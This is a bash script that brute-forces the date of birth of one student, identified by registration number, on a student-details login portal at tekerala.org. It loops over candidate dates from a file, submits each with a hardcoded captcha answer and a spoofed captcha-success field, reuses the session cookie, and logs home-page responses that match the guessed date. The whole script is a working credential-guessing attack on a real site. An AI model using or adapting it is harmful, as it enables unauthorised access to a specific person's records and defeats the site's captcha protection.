#!/bin/bash
#dob
while :
do
cat tdate |sed -n '1p' >tcdate
cat tcdate >>tlogdate
#s=08-06-1999
s=$(cat "tcdate")
#vdate="$(cat tcdate)"
#curl -k -c cookiefile 'https://www.tekerala.org/student_detailss/index.php>'
curl -k -c cookiefile 'https://www.tekerala.org/student_detailss/index.php' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: https://www.tekerala.org' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36' \
  -H 'Referer: https://www.tekerala.org/student_detailss/index.php' \
  --data-raw "regno=18201016&dob=${s}&captcha=chemung&status1=%3Cdiv+style%3D%27color%3A%2300CC33%3B%27%3ECaptcha+validation+succcessfull%3C%2Fdiv%3E&image2.x=35&image2.y=6" \
  --compressed
cat cookiefile |sed 's/\s\+/\n/g' >coo1
cat coo1 |sed '$!d' >coo2
cook=$(cat "coo2")
curl 'https://www.tekerala.org/student_detailss/stud_home1.php' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://www.tekerala.org/student_detailss/index.php' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H "Cookie: PHPSESSID=$cook" \
  --compressed \
  --insecure |grep $s >>teklog

sed -i '1d' tdate
done
